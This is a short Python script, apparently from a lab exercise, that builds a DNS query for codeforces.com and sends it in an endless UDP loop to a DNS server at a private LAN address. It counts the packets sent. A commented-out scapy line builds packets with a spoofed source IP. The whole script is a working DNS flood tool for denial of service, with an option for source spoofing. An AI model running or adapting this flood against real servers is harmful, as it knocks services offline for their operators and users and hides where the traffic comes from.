# from dust i have come, dust i will be

import socket
import random
import signal
from DNS_QueryBuilder import *
from scapy.all import *

cnt = 0

def keyboardInterruptHandler(signal, frame):
    print("KeyboardInterrupt (ID: {}) has been caught. Cleaning up...".format(signal))
    print(cnt, "packets sent so far")
    exit(0)

signal.signal(signal.SIGINT, keyboardInterruptHandler)

q = dns_query()
q.setShowError(True)
q.setShowReport(True)
q.setDomainName("codeforces.com")

payload = q.getDNSQuery()
payload = binascii.unhexlify(payload)

# variables for udp where the ip is not spoofed
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
server_ip='192.168.0.104'
port=53

# spoofed_packet = IP(src='192.168.0.107', dst='192.168.0.104') / UDP(sport=107, dport=53) / payload
# sock = conf.L3socket(iface='enp0s3')

while True:

	#sock.send(spoofed_packet)

	cnt += 1
	sock.sendto(payload, (server_ip, port))
